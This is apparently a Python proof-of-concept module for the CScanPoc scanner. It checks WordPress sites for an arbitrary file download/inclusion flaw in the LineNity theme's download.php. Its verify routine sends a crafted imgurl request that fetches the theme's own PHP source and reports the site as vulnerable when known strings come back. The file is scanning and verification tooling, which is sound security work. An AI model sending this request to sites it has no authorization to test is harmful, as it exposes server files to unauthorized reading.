# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re

class Vuln(ABVuln):
    vuln_id = 'WordPress_0061' # 平台漏洞编号，留空
    name = 'WordPress LineNity主题 任意文件包含'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.LFI # 漏洞类型
    disclosure_date = '2014-04-14'  # 漏洞公布时间
    desc = '''
        'WordPress LineNity主题 /wp-content/themes/linenity/functions/download.php 任意文件上传包含漏洞。
    '''  # 漏洞描述
    ref = 'https://www.exploit-db.com/exploits/32861/'  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress LineNity'  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '291ac5c4-4584-488f-8261-e7d6e67e598f'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-25'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            hh = hackhttp.hackhttp()
            url = self.target
            filename = 'theme-functions.php'
            verify_url = url + ('/wp-content/themes/linenity/functions/download.php?imgurl=%s&name=%s' % (filename, filename) )
            code, head, res, errcode, _ = hh.http(verify_url)

            if re.findall('gplab_changeInsert', res):
                if re.findall('box_excerpt_append', res):
                    #security_hole(verify_url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
